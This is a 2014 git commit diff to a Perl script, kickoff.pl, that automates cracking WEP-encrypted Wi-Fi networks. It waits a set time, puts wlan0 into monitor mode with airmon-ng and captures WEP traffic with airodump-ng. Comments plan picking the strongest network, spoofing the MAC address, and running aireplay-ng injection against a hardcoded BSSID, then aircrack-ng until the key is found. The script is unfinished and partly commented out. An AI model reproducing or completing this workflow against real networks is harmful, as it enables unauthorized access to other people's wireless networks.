68ee2ae13b7b273c64ba4265819750702d182648
jamstheman <kb1cxd@gmail.com>
2014-05-13 22:20:29 -0500

    working the perl

--- kickoff.pl
+++ kickoff.pl
@@ -16,8 +16,62 @@ sub firstrun {
   print "eg: \"perl kickoff.pl 25\"\n";
   #print $ARGV[0];
   exit 0;
+  } else {
+  # since sleep is in seconds, we need to convert it to minutes
+  $sleepytime = $ARGV[0]*60;
+  sleep $sleepytime;
   }
+
 }
   
 firstrun;  
 
+# change the mac address of wlan0 to an android or iphone/ipad device
+
+
+# put wlan0 into monitor mode
+print `airmon-ng start wlan0`;
+
+# now that we're in monitor mode, we need to use the device. 
+
+# this command needs to be fixed. needs to be run a certain length of time. thinking about doing a 
+# `timeout 120 airodump-ng -encrypt WEP mon0 -w wep.txt`
+# this will run the command for 120 seconds; rudimentary but works.
+
+print `airodump-ng -encrypt WEP mon0 -w wep.txt`;
+
+
+# once this is in the file, we should parse the first couple lines and look for pertenent data:
+# mac address, broadcast strength (as we want to crack the loudest one) and SSID
+# the file we should parse should be wep.txt-01.csv
+
+# cat wep.txt-01.csv | grep WEP | cut -d ',' -f1,9,14 > out.txt
+
+# found out which value is largest out of the bunch... this is gonna take some perl foo.
+# open file, for each line, grab 2nd value. compare
+
+use List::Util qw( min max );
+
+open(WEP, "<out.txt");
+
+# for each line, put the 2nd column into @sigstrength
+
+
+
+#my $min = min @numbers;
+my $max = max @numbers;
+
+
+# after the pertenent data is parsed, then 
+# airodump-ng -c 11 --bssid (mac we want to crack) -w output mon0
+
+
+
+
+#aireplay-ng -1 0 -a E0:91:F5:FD:D7:E2 mon0
+#aireplay-ng -3 -b E0:91:F5:FD:D7:E2 mon0
+
+
+#aircrack-ng output-01.cap 
+
+#wait for "key found"
